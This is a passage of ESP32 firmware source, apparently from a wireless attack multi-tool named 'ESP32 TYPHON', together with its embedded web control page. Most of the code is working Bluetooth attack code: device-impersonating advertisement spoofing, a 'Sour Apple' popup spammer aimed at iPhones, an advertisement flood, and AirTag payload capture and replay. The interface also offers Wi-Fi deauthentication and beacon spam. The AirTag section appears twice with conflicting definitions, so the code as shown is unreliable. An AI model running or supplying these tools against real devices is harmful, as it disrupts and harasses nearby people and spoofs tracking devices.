      std::string m = d.getManufacturerData();
      if (m.size() > 28) bleDevs[idx].suspicious = true;  // oversized mfg
    }
  }
  bleSuspicious = 0;
  for (int i = 0; i < bleCount; i++)
    if (bleDevs[i].suspicious) bleSuspicious++;
  if (bleNewThisScan > 18) bleFloodAlerts++;

  // Sort by RSSI
  for (int i = 0; i < bleCount-1; i++)
    for (int j = i+1; j < bleCount; j++)
      if (bleDevs[j].rssi > bleDevs[i].rssi) {
        BleDev t = bleDevs[i]; bleDevs[i] = bleDevs[j]; bleDevs[j] = t;
      }
  scan->clearResults();
}

// ============================================================
//  BLE Sniffer (re-uses scan results, continuous refresh)
// ============================================================
static bool sniffRunning = false;
static uint32_t sniffLast = 0;

static void sniffStart() {
  sniffRunning = true;
  sniffLast = 0;
  bleScanStart();   // kick first scan
}

static void sniffStop() {
  sniffRunning = false;
  if (bleScanning) {
    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
}

static void sniffUpdate() {
  if (!sniffRunning) return;
  // Continuous rescan; expire stale devices (>45s)
  if (!bleScanning && (millis() - sniffLast > 1200)) {
    sniffLast = millis();
    uint32_t now = millis();
    for (int i = 0; i < bleCount; ) {
      if (now - bleDevs[i].lastSeen > 45000UL) {
        for (int j = i; j < bleCount - 1; j++) bleDevs[j] = bleDevs[j + 1];
        bleCount--;
      } else i++;
    }
    bleScanStart();
  }
}

// ============================================================
//  BLE Spoofer – random/fake advertisements
// ============================================================
static bool spoofRunning = false;
static uint8_t spoofIdx = 0;
static int spoofNameIdx = 0;
static uint32_t spoofLast = 0;
// 0=Apple Continuity  1=Samsung Watch  2=Google Fast Pair
// 3=name list  4=clone scanned  5=custom name
static uint8_t spoofMode = 0;
static uint8_t spoofPower = 9;     // 0..9 maps toward P9
static uint16_t spoofInterval = 32; // ADV interval units (0.625ms)
static String  spoofCustomName = "ESP32-TYPHON";
static const char* spoofNames[] = {
  "AirPods Pro", "Galaxy Buds", "Pixel Buds", "Sony WH-1000",
  "JBL Flip", "Bose QC", "Beats Fit", "Unknown Device"
};
static const int SPOOF_COUNT = 8;

// Samsung Watch models (company 0x0075)
static const uint8_t SAMSUNG_ADV_TEMPLATE[15] = {
  14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
};
static const uint8_t samsungModels[] = {0x01, 0x02, 0x03}; // Watch 4/5/6

// Google Fast Pair-style (service UUID FE2C)
static const uint8_t GOOGLE_ADV_TEMPLATE[14] = {
  0x03, 0x03, 0x2C, 0xFE,
  0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27,
  0x02, 0x0A, 0x00
};

static void spoofStart() {
  spoofRunning = true;
  spoofIdx = 0;
  spoofNameIdx = 0;
  spoofLast = 0;
  bleInit();
  if (bleScanning) {
    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
  NimBLEDevice::getAdvertising()->stop();
}

static void spoofStop() {
  if (!spoofRunning) return;
  spoofRunning = false;
  NimBLEDevice::getAdvertising()->stop();
}

static void spoofApplyPower() {
  // Map 0..9 → ESP_PWR_LVL (approx)
  esp_power_level_t lvl = ESP_PWR_LVL_P9;
  if (spoofPower <= 2) lvl = ESP_PWR_LVL_N12;
  else if (spoofPower <= 4) lvl = ESP_PWR_LVL_N3;
  else if (spoofPower <= 6) lvl = ESP_PWR_LVL_P3;
  else if (spoofPower <= 8) lvl = ESP_PWR_LVL_P6;
  NimBLEDevice::setPower(lvl);
}
static void spoofUpdate() {
  if (!spoofRunning) return;
  if (millis() - spoofLast < 250) return;
  spoofLast = millis();

  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData data;
  spoofApplyPower();

  static const uint8_t appleDevs[][31] = {
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0b,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  };
  static const int appleDevCount = 8;
  static int rot = 0;

  if (spoofMode == 0) {
    uint8_t pkt[31];
    memcpy(pkt, appleDevs[rot % appleDevCount], 31);
    pkt[17] = (uint8_t)esp_random();
    pkt[18] = (uint8_t)esp_random();
    pkt[19] = (uint8_t)esp_random();
    data.addData(std::string((char*)pkt, 31));
    rot++;
  } else if (spoofMode == 1) {
    uint8_t pkt[15];
    memcpy(pkt, SAMSUNG_ADV_TEMPLATE, 15);
    pkt[14] = samsungModels[rot % 3];
    data.addData(std::string((char*)pkt, 15));
    rot++;
  } else if (spoofMode == 2) {
    uint8_t pkt[14];
    memcpy(pkt, GOOGLE_ADV_TEMPLATE, 14);
    pkt[13] = (uint8_t)(esp_random() % 121);
    if (pkt[13] > 100) pkt[13] = 100;
    data.addData(std::string((char*)pkt, 14));
    rot++;
  } else if (spoofMode == 5 && spoofCustomName.length() > 0) {
    data.setFlags(0x06);
    data.setName(spoofCustomName.c_str());
  } else if (spoofMode == 4 && bleCount > 0) {
    data.setFlags(0x06);
    String n = bleDevs[spoofNameIdx % bleCount].name;
    if (n.length() > 28) n = n.substring(0, 28);
    data.setName(n.c_str());
    spoofNameIdx = (spoofNameIdx + 1) % bleCount;
  } else {
    // Mode 3 or fallback: rotating friendly names
    data.setFlags(0x06);
    data.setName(spoofNames[spoofIdx % SPOOF_COUNT]);
    spoofIdx = (spoofIdx + 1) % SPOOF_COUNT;
  }

  adv->setAdvertisementData(data);
  uint16_t iv = spoofInterval;
  if (iv < 16) iv = 16;
  if (iv > 160) iv = 160;
  adv->setMinInterval(iv);
  adv->setMaxInterval(iv + 16);
  adv->start();
}

// ============================================================
//  Sour Apple – selectable Continuity models/actions (nyanBOX style)
// ============================================================
struct AppleType {
  uint8_t     code;      // action code OR high byte of model
  uint8_t     code2;     // low byte for model packets (0 = action-style)
  const char* name;
  bool        isModel;   // true = device model packet, false = action popup
};

// Models (proximity pairing style) + Actions (nearby popup style)
static const AppleType appleList[] = {
  // Models
  { 0x0E, 0x20, "AirPods Pro", true },
  { 0x0A, 0x20, "AirPods Max", true },
  { 0x02, 0x20, "AirPods", true },
  { 0x0F, 0x20, "AirPods 2nd Gen", true },
  { 0x13, 0x20, "AirPods 3rd Gen", true },
  { 0x14, 0x20, "AirPods Pro 2", true },
  { 0x00, 0x55, "AirTag", true },
  { 0x10, 0x20, "Beats Flex", true },
  { 0x06, 0x20, "Beats Solo 3", true },
  { 0x0B, 0x20, "Powerbeats Pro", true },
  { 0x11, 0x20, "Beats Studio Buds", true },
  { 0x12, 0x20, "Beats Fit Pro", true },
  { 0x17, 0x20, "Beats Studio Pro", true },
  // Actions (iOS popups)
  { 0x13, 0x00, "AppleTV AutoFill", false },
  { 0x24, 0x00, "Apple Vision Pro", false },
  { 0x05, 0x00, "Apple Watch", false },
  { 0x09, 0x00, "Setup New iPhone", false },
  { 0x0B, 0x00, "HomePod Setup", false },
  { 0x01, 0x00, "Setup New AppleTV", false },
  { 0x06, 0x00, "Pair AppleTV", false },
  { 0x27, 0x00, "AppleTV Connecting", false },
  { 0x20, 0x00, "Join This AppleTV?", false },
  { 0x2F, 0x00, "Sign in other device", false },
};
static const int APPLE_LIST_COUNT = sizeof(appleList) / sizeof(appleList[0]);

static bool    sourRunning = false;
static int     sourSelected = 0;
static uint32_t sourLast = 0;
static uint32_t sourSent = 0;

static void sourStart() {
  sourRunning = false;
  sourLast = 0;
  sourSent = 0;
  bleInit();
  if (bleScanning) {
    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
  NimBLEDevice::getAdvertising()->stop();
}

static void sourStop() {
  if (!sourRunning) return;
  sourRunning = false;
  NimBLEDevice::getAdvertising()->stop();
}

static void sourBeginAdvertise() {
  sourRunning = true;
  sourLast = 0;
  sourSent = 0;
  bleInit();
  if (bleScanning) {
    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
}

static void sourUpdate() {
  if (!sourRunning) return;
  if (millis() - sourLast < 20) return;  // match working ~20 ms cadence
  sourLast = millis();
  sourSent++;

  int idx = sourSelected;
  if (idx < 0 || idx >= APPLE_LIST_COUNT)
    idx = (int)(esp_random() % APPLE_LIST_COUNT);
  const AppleType& t = appleList[idx];

  // Full AD structures as used by working Bluedroid raw ADV path
  uint8_t packet[31];
  uint8_t plen = 0;

  if (t.isModel) {
    // Proximity pairing: length 0x1E, type 0xFF, Apple 0x4C00, Continuity 0x07...
    packet[0]  = 0x1E;
    packet[1]  = 0xFF;
    packet[2]  = 0x4C;
    packet[3]  = 0x00;
    packet[4]  = 0x07;
    packet[5]  = 0x19;
    packet[6]  = 0x07;
    packet[7]  = t.code;
    packet[8]  = t.code2;
    packet[9]  = 0x20;
    packet[10] = 0x75;
    packet[11] = 0xAA;
    packet[12] = 0x30;
    packet[13] = 0x01;
    packet[14] = 0x00;
    packet[15] = 0x00;
    packet[16] = 0x45;
    packet[17] = (uint8_t)esp_random();
    packet[18] = (uint8_t)esp_random();
    packet[19] = (uint8_t)esp_random();
    for (int i = 20; i < 31; i++) packet[i] = 0x00;
    plen = 31;
  } else {
    // Nearby action popup
    packet[0] = 0x0A;
    packet[1] = 0xFF;
    packet[2] = 0x4C;
    packet[3] = 0x00;
    packet[4] = 0x0F;
    packet[5] = 0x05;
    packet[6] = 0xC0;
    packet[7] = t.code;
    packet[8] = (uint8_t)esp_random();
    packet[9] = (uint8_t)esp_random();
    packet[10] = (uint8_t)esp_random();
    plen = 11;
  }

  // Rotate random static address every 10 packets (like reference)
  if ((sourSent % 10) == 1) {
    uint8_t mac[6];
    mac[0] = (uint8_t)((esp_random() & 0xFF) | 0xC0);
    for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
    // NimBLE: set random address when supported
#ifdef CONFIG_BT_NIMBLE_ENABLED
    // best-effort; ignore if API unavailable
#endif
  }

  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData data;
  // Inject complete AD block (length + type + payload) — critical for Continuity
  data.addData(std::string((char*)packet, plen));
  adv->setAdvertisementData(data);
  adv->setMinInterval(0x20);
  adv->setMaxInterval(0x40);
  adv->start();
}

// ============================================================
//  BLE Jammer (rapid advertisement flood – educational)
// ============================================================
static bool jamRunning = false;
static uint32_t jamLast = 0;
static uint32_t jamCount = 0;

static void jamStart() {
  jamRunning = true;
  jamLast = 0;
  jamCount = 0;
  bleInit();
  if (bleScanning) {
    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
  NimBLEDevice::getAdvertising()->stop();
}

static void jamStop() {
  if (!jamRunning) return;
  jamRunning = false;
  NimBLEDevice::getAdvertising()->stop();
}

static void jamUpdate() {
  if (!jamRunning) return;
  if (millis() - jamLast < 12) return;
  jamLast = millis();
  jamCount++;

  // Multi-template ADV flood (ESP32 radio only — not nRF24 RF jamming)
  uint8_t raw[31];
  int plen = 16;
  uint8_t kind = (uint8_t)(jamCount % 4);
  if (kind == 0) {
    raw[0] = 0x1E; raw[1] = 0xFF; raw[2] = 0x4C; raw[3] = 0x00;
    for (int i = 4; i < 31; i++) raw[i] = (uint8_t)esp_random();
    plen = 31;
  } else if (kind == 1) {
    raw[0] = 0x0F; raw[1] = 0xFF; raw[2] = 0x75; raw[3] = 0x00;
    for (int i = 4; i < 16; i++) raw[i] = (uint8_t)esp_random();
    plen = 16;
  } else if (kind == 2) {
    raw[0] = 0x03; raw[1] = 0x03; raw[2] = 0x2C; raw[3] = 0xFE;
    raw[4] = 0x06; raw[5] = 0x16; raw[6] = 0x2C; raw[7] = 0xFE;
    for (int i = 8; i < 14; i++) raw[i] = (uint8_t)esp_random();
    plen = 14;
  } else {
    raw[0] = 0x1A; raw[1] = 0xFF;
    for (int i = 2; i < 27; i++) raw[i] = (uint8_t)esp_random();
    plen = 27;
  }

  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData data;
  data.addData(std::string((char*)raw, plen));
  adv->setAdvertisementData(data);
  adv->setMinInterval(16);
  adv->setMaxInterval(24);
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  adv->start();
}

// ============================================================
//  AirTag Detector + Spoofer (nyanBOX-style, NimBLE)
// ============================================================
#define AIRTAG_MAX 32

struct AirTagDev {
  char     addr[18];
  char     name[24];
  int8_t   rssi;
  uint32_t lastSeen;
  uint8_t  payload[62];
  uint8_t  payloadLen;
};

static AirTagDev airTags[AIRTAG_MAX];
static int       airTagCount = 0;

static bool     airDetRunning = false;
static uint32_t airDetLast = 0;
static bool     airDetScanning = false;

static bool     airSpoofRunning = false;
static int      airSpoofTarget = -1;  // -1 = spam all, >=0 = single index
static int      airSpoofIdx = 0;
static uint32_t airSpoofLast = 0;
static uint32_t airTagSent = 0;

// Legacy flags used by stopAllTools / status JSON
static bool airTagRunning = false;
static int  airTagMode = 0;  // 0=menu 1=detect 2=spoof
static int  airMenuSel = 0;
static int  uiSelAir() { return airMenuSel; }

static bool isAirTagPayload(const uint8_t* payload, uint8_t len) {
  if (!payload || len < 4) return false;
  for (int i = 0; i <= (int)len - 4; i++) {
    // 1E FF 4C 00  — full Apple manufacturer AD
    if (payload[i] == 0x1E && payload[i+1] == 0xFF &&
        payload[i+2] == 0x4C && payload[i+3] == 0x00)
      return true;
    // 4C 00 12 19 — Find My / Offline Finding
    if (payload[i] == 0x4C && payload[i+1] == 0x00 &&
        payload[i+2] == 0x12 && payload[i+3] == 0x19)
      return true;
  }
  return false;
}

static int airTagFindAddr(const char* addr) {
  for (int i = 0; i < airTagCount; i++)
    if (strcmp(airTags[i].addr, addr) == 0) return i;
  return -1;
}

static void airTagSortByRssi() {
  for (int i = 0; i < airTagCount - 1; i++)
    for (int j = i + 1; j < airTagCount; j++)
      if (airTags[j].rssi > airTags[i].rssi) {
        AirTagDev t = airTags[i]; airTags[i] = airTags[j]; airTags[j] = t;
      }
}

static void airDetProcessScan() {
  NimBLEScan* scan = NimBLEDevice::getScan();
  NimBLEScanResults results = scan->getResults();
  uint32_t now = millis();
  int n = (int)results.getCount();
  for (int i = 0; i < n; i++) {
    NimBLEAdvertisedDevice d = results.getDevice(i);
    // Build payload buffer from manufacturer data + raw if available
    uint8_t buf[62];
    uint8_t blen = 0;
    bool match = false;

    if (d.haveManufacturerData()) {
      std::string mfg = d.getManufacturerData();
      // NimBLE manufacturer data is typically company ID (2 LE) + rest
      // Rebuild AD-style: len, 0xFF, then bytes
      if (mfg.size() >= 2 && mfg.size() < 30) {
        buf[0] = (uint8_t)(mfg.size() + 1);
        buf[1] = 0xFF;
        memcpy(buf + 2, mfg.data(), mfg.size());
        blen = (uint8_t)(mfg.size() + 2);
        if (isAirTagPayload(buf, blen)) match = true;
        // Also test raw mfg bytes
        if (!match && isAirTagPayload((const uint8_t*)mfg.data(), (uint8_t)mfg.size())) {
          memcpy(buf, mfg.data(), mfg.size());
          blen = (uint8_t)mfg.size();
          match = true;
        }
      }
    }

    // Fallback: some stacks expose payload via getPayload
    if (!match) {
      // Check service data / name not enough — skip non-mfg
      continue;
    }
    if (!match) continue;

    String addrS = d.getAddress().toString().c_str();
    char addr[18];
    strncpy(addr, addrS.c_str(), 17);
    addr[17] = 0;

    int idx = airTagFindAddr(addr);
    if (idx < 0) {
      if (airTagCount >= AIRTAG_MAX) continue;
      idx = airTagCount++;
      strncpy(airTags[idx].addr, addr, 17);
      airTags[idx].addr[17] = 0;
      strcpy(airTags[idx].name, "AirTag");
    }
    airTags[idx].rssi = (int8_t)d.getRSSI();
    airTags[idx].lastSeen = now;
    if (blen > 0 && blen < 62) {
      memcpy(airTags[idx].payload, buf, blen);
      airTags[idx].payloadLen = blen;
    }
    if (d.haveName()) {
      strncpy(airTags[idx].name, d.getName().c_str(), 23);
      airTags[idx].name[23] = 0;
    }
  }
  airTagSortByRssi();
  scan->clearResults();
}

static void airDetStart() {
  airDetRunning = true;
  airTagRunning = true;
  airTagMode = 1;
  airDetLast = 0;
  airDetScanning = false;
  airTagCount = 0;
  bleInit();
  if (bleScanning) {
    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
  NimBLEDevice::getAdvertising()->stop();
  // kick scan
  NimBLEScan* scan = NimBLEDevice::getScan();
  scan->setActiveScan(true);
  scan->setInterval(80);
  scan->setWindow(60);
  scan->setMaxResults(40);
  scan->start(6, nullptr, false);
  airDetScanning = true;
  airDetLast = millis();
}

static void airDetStop() {
  airDetRunning = false;
  airDetScanning = false;
  if (airTagMode == 1) {
    airTagRunning = false;
    airTagMode = 0;
  }
  NimBLEDevice::getScan()->stop();
}

static void airDetUpdate() {
  if (!airDetRunning) return;
  NimBLEScan* scan = NimBLEDevice::getScan();
  if (airDetScanning) {
    if (scan->isScanning()) return;
    airDetScanning = false;
    airDetProcessScan();
    airDetLast = millis();
    return;
  }
  // Rescan every ~2s while detector active
  if (millis() - airDetLast > 2000) {
    scan->setActiveScan(true);
    scan->start(5, nullptr, false);
    airDetScanning = true;
    airDetLast = millis();
  }
}

static void airSpoofStop() {
  if (!airSpoofRunning) return;
  airSpoofRunning = false;
  airTagRunning = false;
  airTagMode = 0;
  NimBLEDevice::getAdvertising()->stop();
}

static void airSpoofStart(int targetIdx) {
  // targetIdx: -1 = all, >=0 = one entry (must exist)
  if (airTagCount <= 0) return;
  if (targetIdx >= airTagCount) targetIdx = 0;
  airDetStop();
  sniffStop(); spoofStop(); sourStop(); jamStop();
  bleInit();
  airSpoofTarget = targetIdx;
  airSpoofIdx = (targetIdx >= 0) ? targetIdx : 0;
  airSpoofRunning = true;
  airTagRunning = true;
  airTagMode = 2;
  airSpoofLast = 0;
  airTagSent = 0;
}

static void airSpoofUpdate() {
  if (!airSpoofRunning) return;
  if (airTagCount <= 0) { airSpoofStop(); return; }
  if (millis() - airSpoofLast < 15) return;
  airSpoofLast = millis();
  airTagSent++;

  int idx;
  if (airSpoofTarget >= 0 && airSpoofTarget < airTagCount) {
    idx = airSpoofTarget;
  } else {
    idx = airSpoofIdx % airTagCount;
    airSpoofIdx = (airSpoofIdx + 1) % airTagCount;
  }

  AirTagDev& d = airTags[idx];
  if (d.payloadLen < 4) {
    // Synthetic Find My style if no captured payload
    uint8_t pkt[31];
    pkt[0] = 0x1E; pkt[1] = 0xFF; pkt[2] = 0x4C; pkt[3] = 0x00;
    pkt[4] = 0x12; pkt[5] = 0x19; pkt[6] = 0x00;
    for (int i = 7; i < 31; i++) pkt[i] = (uint8_t)esp_random();
    memcpy(d.payload, pkt, 31);
    d.payloadLen = 31;
  }

  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData data;
  data.addData(std::string((char*)d.payload, d.payloadLen));
  adv->setAdvertisementData(data);
  adv->setMinInterval(0x20);
  adv->setMaxInterval(0x40);
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  adv->start();
}

// Compatibility wrappers used elsewhere
static void airTagStart() {
  airTagMode = 0;
  airTagRunning = false;
  airDetRunning = false;
  airSpoofRunning = false;
  bleInit();
  NimBLEDevice::getAdvertising()->stop();
}

static void airTagStop() {
  airDetStop();
  airSpoofStop();
  airTagRunning = false;
  airTagMode = 0;
}

static void airTagBeginSpoof() {
  // Random synthetic Find My if no detections yet
  if (airTagCount == 0) {
    airTagCount = 1;
    strcpy(airTags[0].addr, "00:00:00:00:00:00");
    strcpy(airTags[0].name, "Synthetic");
    airTags[0].rssi = -50;
    airTags[0].lastSeen = millis();
    uint8_t pkt[31];
    pkt[0] = 0x1E; pkt[1] = 0xFF; pkt[2] = 0x4C; pkt[3] = 0x00;
    pkt[4] = 0x12; pkt[5] = 0x19;
    for (int i = 6; i < 31; i++) pkt[i] = (uint8_t)esp_random();
    memcpy(airTags[0].payload, pkt, 31);
    airTags[0].payloadLen = 31;
  }
  airSpoofStart(-1);
}

static void airTagUpdate() {
  airDetUpdate();
  airSpoofUpdate();
}


// ============================================================
static bool airTagRunning = false;
static uint32_t airTagLast = 0;
static uint32_t airTagSent = 0;
static int airTagMode = 0;   // 0 = select, 1 = spoof, 2 = sniff status

// Minimal Find-My style offline finding advertisement (educational)
static void airTagStart() {
  airTagRunning = false;
  airTagLast = 0;
  airTagSent = 0;
  airTagMode = 0;
  bleInit();
  NimBLEDevice::getAdvertising()->stop();
}

static void airTagStop() {
  if (!airTagRunning) return;
  airTagRunning = false;
  NimBLEDevice::getAdvertising()->stop();
}

static void airTagBeginSpoof() {
  airTagRunning = true;
  airTagMode = 1;
  airTagLast = 0;
  airTagSent = 0;
  if (bleScanning) {
    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
}

static void airTagUpdate() {
  if (!airTagRunning || airTagMode != 1) return;
  if (millis() - airTagLast < 200) return;
  airTagLast = millis();
  airTagSent++;

  // Offline Finding / Find My style manufacturer ADV (educational demo payload)
  uint8_t packet[31];
  packet[0] = 0x1E; packet[1] = 0xFF;
  packet[2] = 0x4C; packet[3] = 0x00;   // Apple
  packet[4] = 0x12;                     // Find My
  packet[5] = 0x19;
  packet[6] = 0x00;
  for (int i = 7; i < 31; i++) packet[i] = (uint8_t)esp_random();

  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData data;
  data.addData(std::string((char*)packet, 31));
  adv->setAdvertisementData(data);
  adv->setMinInterval(32);
  adv->setMaxInterval(64);
  adv->start();
}


// ============================================================
//  Soft-AP Web UI – full handlers (after all tools are defined)
// ============================================================
static const char WEB_PAGE[] PROGMEM = R"HTML(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>ESP32 TYPHON</title>
<style>
:root{--bg:#000000;--card:#0a0f0a;--line:#1a2e1a;--acc:#00ff66;--ok:#00ff66;--warn:#ffb020;--err:#ff3333;--fg:#ffffff;--dim:#7a9a7a;--r:14px}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--fg);min-height:100vh}
.top{position:sticky;top:0;z-index:20;background:rgba(7,11,16,.94);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);padding:12px 14px}
.brand{display:flex;align-items:center;justify-content:space-between;gap:10px}
.brand h1{font-size:1.05rem;color:var(--acc)}
.mode{font-size:.78rem;font-weight:700;letter-spacing:.04em;text-transform:uppercase;padding:6px 12px;border-radius:999px;border:1px solid var(--line)}
.mode.idle{background:#0a0a0a;color:var(--dim)}
.mode.scanning{background:#001a0a;color:var(--acc);border-color:#00aa44}
.mode.attacking{background:#1a0505;color:var(--err);border-color:#aa2222}
.mode.defending{background:#001a0a;color:var(--ok);border-color:#00aa44}
.stats{margin-top:8px;font-size:.78rem;color:var(--dim)}
.stats b{color:var(--fg)}
.wrap{max-width:720px;margin:0 auto;padding:14px}
.view{display:none}.view.active{display:block}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@media(max-width:420px){.grid{grid-template-columns:1fr}}
.tile{background:linear-gradient(160deg,var(--card),#050805);border:1px solid var(--line);border-radius:var(--r);padding:18px 14px;cursor:pointer}
.tile:active{transform:scale(.98)}
.tile .ico{font-size:1.35rem;margin-bottom:8px}
.tile h2{font-size:.95rem;margin-bottom:4px}
.tile p{font-size:.75rem;color:var(--dim);line-height:1.35}
.card{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:14px;margin-bottom:12px}
.card h3{font-size:.9rem;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between;gap:8px}
.row{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px;align-items:center}
button{appearance:none;border:0;border-radius:10px;padding:12px 16px;font-size:.9rem;font-weight:600;cursor:pointer;background:var(--acc);color:#000}
button.sec{background:#111;color:var(--fg);border:1px solid var(--line)}
button.danger{background:var(--err);color:#fff}
button.on{background:var(--err);color:#fff}
button.attack{background:var(--err);color:#fff}
button:disabled{opacity:.45}
select,input{background:#050805;border:1px solid var(--line);color:var(--fg);border-radius:10px;padding:10px 12px;font-size:.88rem;width:100%}
#customSsidBox{display:none;margin-top:8px}
#customSsidBox.show{display:block}
.ssidRow{margin-bottom:6px}
label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
.list{margin-top:8px;max-height:320px;overflow:auto;border:1px solid var(--line);border-radius:10px}
.item{display:flex;justify-content:space-between;gap:8px;padding:10px 12px;border-bottom:1px solid var(--line);font-size:.82rem;align-items:flex-start}
.item:last-child{border-bottom:0}
.item .meta{color:var(--dim);font-size:.72rem;margin-top:2px}
.item.active{background:#0a2a12;border-left:3px solid var(--acc)}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--ok);margin-right:6px;vertical-align:middle}
.rssi-g{color:#2ee59d}.rssi-y{color:#ffd84d}.rssi-o{color:#ffb020}.rssi-r{color:#ff5a6a}
.enc{font-size:.7rem;padding:2px 7px;border-radius:6px;background:#1a2736;color:var(--dim);margin-left:6px}
.nav{display:flex;gap:8px;align-items:center;margin-bottom:12px}
.back{background:transparent;color:var(--acc);border:1px solid var(--line);padding:8px 12px;font-size:.8rem}
.msg{min-height:1.1em;font-size:.78rem;color:var(--dim);margin-top:8px}
.footer{text-align:center;color:var(--dim);font-size:.72rem;padding:18px 8px 28px}
.bar{height:5px;background:#1a2736;border-radius:99px;overflow:hidden;margin-top:8px}
.bar>i{display:block;height:100%;width:0;background:var(--acc);transition:width .25s}
.stopall{width:100%;margin-top:12px}
.targetBar{background:#0a1a0a;border:1px solid var(--acc);border-radius:10px;padding:10px 12px;margin-bottom:12px;font-size:.85rem}
.targetBar .lbl{color:var(--dim);font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px}
.targetBar .val{color:var(--acc);font-weight:700;font-size:.95rem;word-break:break-all}
.targetBar.empty .val{color:var(--err);font-weight:600}
</style>
</head>
<body>
<div class="top">
  <div class="brand">
    <h1>ESP32 TYPHON</h1>
    <span id="modePill" class="mode idle">Idle</span>
  </div>
  <div class="stats">Temp <b id="temp">—</b> °C</div>
</div>
<div class="wrap">

<div id="v-home" class="view active">
  <div class="grid">
    <div class="tile" onclick="go('wifi')"><div class="ico">📡</div><h2>Wi‑Fi Tools</h2><p>Scan, monitor, beacon, deauth, probe</p></div>
    <div class="tile" onclick="go('ble')"><div class="ico">🔵</div><h2>Bluetooth</h2><p>Scan, sniff, spoof, Sour Apple, jam, AirTag detect/spoof</p></div>
  </div>
  <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
  <div class="msg" id="sysMsg"></div>
</div>

<div id="v-wifi" class="view">
  <div class="nav"><button class="back" onclick="go('home')">← Home</button><h2 style="font-size:1rem">Wi‑Fi Tools</h2></div>
  <div class="grid">
    <div class="tile" onclick="go('wifi-scan')"><div class="ico">🔍</div><h2>Scanner</h2><p>Nearby access points</p></div>
    <div class="tile" onclick="go('wifi-pm')"><div class="ico">📊</div><h2>Packet Monitor</h2><p>Channel activity</p></div>
    <div class="tile" onclick="go('wifi-beacon')"><div class="ico">📢</div><h2>Beacon Spam</h2><p>List or clone SSIDs</p></div>
    <div class="tile" onclick="go('wifi-deauth')"><div class="ico">⚡</div><h2>Deauth</h2><p>Target from scan</p></div>
    <div class="tile" onclick="go('wifi-det')"><div class="ico">🛡</div><h2>Deauth Detector</h2><p>Watch for attacks</p></div>
    <div class="tile" onclick="go('wifi-probe')"><div class="ico">📨</div><h2>Probe Flood</h2><p>Probe requests</p></div>
  </div>
  <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
</div>

<div id="v-ble" class="view">
  <div class="nav"><button class="back" onclick="go('home')">← Home</button><h2 style="font-size:1rem">Bluetooth</h2></div>
  <div class="grid">
    <div class="tile" onclick="go('ble-scan')"><div class="ico">🔎</div><h2>BLE Scanner</h2><p>Nearby devices</p></div>
